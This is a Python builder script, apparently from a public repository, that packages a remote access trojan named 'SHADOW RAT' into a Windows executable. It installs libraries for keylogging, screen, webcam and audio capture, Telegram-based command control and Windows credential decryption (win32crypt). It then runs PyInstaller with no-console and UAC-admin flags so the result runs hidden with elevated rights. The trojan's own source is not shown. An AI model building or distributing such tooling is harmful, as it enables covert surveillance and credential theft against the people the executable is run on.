# Developer: Sreeraj
# GitHub: https://github.com/s-r-e-e-r-a-j

import os
import sys
import shutil
import subprocess

def build_rat() -> bool:
    print("SHADOW RAT Builder")
    print("=" * 50)
    
    main_script: str = "shadow_rat.py"
    
    if not os.path.exists(main_script):
        print(f"Error: {main_script} not found in current directory")
        print("Make sure your RAT script is named 'shadow_rat.py'")
        return False
    
    print(f"Found {main_script}")
    
    dependencies: list[str] = [
        "pyautogui",
        "opencv-python",
        "pyttsx3", 
        "numpy",
        "pynput",
        "requests",
        "pytelegrambotapi",
        "pillow",
        "psutil",
        "pywin32",
        "pycryptodome",
        "pyaudio"
    ]
    
    print("\nDependencies to install:")
    for dep in dependencies:
        print(f"  - {dep}")
    
    install: str = input("\nInstall dependencies? (y/n): ").lower()
    if install == 'y':
        for dep in dependencies:
            print(f"Installing {dep}...")
            subprocess.run(["pip", "install", dep], capture_output=True)
    
    hidden_imports: list[str] = [
        "pyautogui",
        "cv2",
        "pyttsx3.drivers",
        "pyttsx3.drivers.sapi5",
        "pyaudio",
        "pynput.keyboard",
        "pynput.mouse",
        "telebot",
        "requests",
        "numpy",
        "psutil",
        "win32crypt",
        "Crypto",
        "Crypto.Cipher",
        "Crypto.Cipher.AES"
    ]
    
    cmd: list[str] = ["pyinstaller", "--onefile", "--noconsole", "--name=SHADOW_RAT", "--uac-admin", "--collect-all=telebot", "--collect-all=Crypto"]
    
    for imp in hidden_imports:
        cmd.append(f"--hidden-import={imp}")
    
    cmd.append(main_script)
    
    print("\nBuilding executable...")
    result = subprocess.run(cmd)
    
    if result.returncode == 0:
        print("\nBuild successful!")
        exe_path: str = os.path.join("dist", "SHADOW_RAT.exe")
        if os.path.exists(exe_path):
            print(f"Executable created at: {exe_path}")
            print(f"Size: {os.path.getsize(exe_path) / 1024 / 1024:.2f} MB")
            
            copy: str = input("\nCopy to current directory? (y/n): ").lower()
            if copy == 'y':
                shutil.copy(exe_path, "SHADOW_RAT.exe")
                print("Copied to: SHADOW_RAT.exe")
        return True
    else:
        print("\nBuild failed!")
        return False

def clean_build() -> None:
    folders: list[str] = ["build", "dist", "__pycache__"]
    files: list[str] = ["shadow_rat.spec"]
    
    for folder in folders:
        if os.path.exists(folder):
            shutil.rmtree(folder)
            print(f"Removed: {folder}")
    
    for file in files:
        if os.path.exists(file):
            os.remove(file)
            print(f"Removed: {file}")

def main() -> None:
    print("SHADOW RAT Builder Tool")
    print("1. Build executable")
    print("2. Clean build files")
    print("3. Full rebuild (clean + build)")
    
    choice: str = input("\nSelect option (1-3): ")
    
    if choice == "1":
        build_rat()
    elif choice == "2":
        clean_build()
    elif choice == "3":
        clean_build()
        build_rat()
    else:
        print("Invalid option")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
